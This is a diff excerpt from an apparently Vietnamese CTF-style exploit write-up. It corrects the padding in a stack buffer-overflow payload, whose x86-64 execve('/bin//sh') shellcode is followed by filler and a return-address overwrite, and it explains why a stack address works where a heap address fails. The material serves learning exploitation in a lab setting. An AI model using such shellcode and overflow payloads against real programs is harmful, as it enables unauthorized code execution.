@@ -470,7 +470,7 @@ __Shellcode sau khi assemble__:
 
 __Chuỗi payload input lần 2__:
 ```
-"\x48\x31\xC0\x50\x48\xB8\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\x31\xC0\x48\x83\xF0\x3B\x0F\x05" + "a"*33 + dest_addr
+"\x48\x31\xC0\x50\x48\xB8\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\x31\xC0\x48\x83\xF0\x3B\x0F\x05" + "a"*103 + dest_addr
 ```
 Chắc bạn cũng đã để ý rằng ở đây mình phải dùng địa chỉ `dest_addr` trong stack chứa shellcode thay vì địa chỉ `s` trong heap cũng chứa shellcode.    
 Bởi vì địa chỉ `s` trong heap là 0x602260 chỉ có 3 bytes, nhưng 1 stack trong kiến trúc 64-bit có thể chứa 8 bytes, mà mình lại không thể ghi thêm 0x0000000000 vào chuỗi để nó trở thành 0x0000000000602260, nên nếu trong stack đã có sẵn 1 vài bytes bất kì thì lúc ghi đè vào return address, return address sẽ trở thành 0x??????????602260 (?? là 1 byte bất kì có sẵn trong stack, có thể bằng 0x00, có thể bằng giá trị khác) => sai địa chỉ chứa shellcode => lỗi thực thi chương trình.   
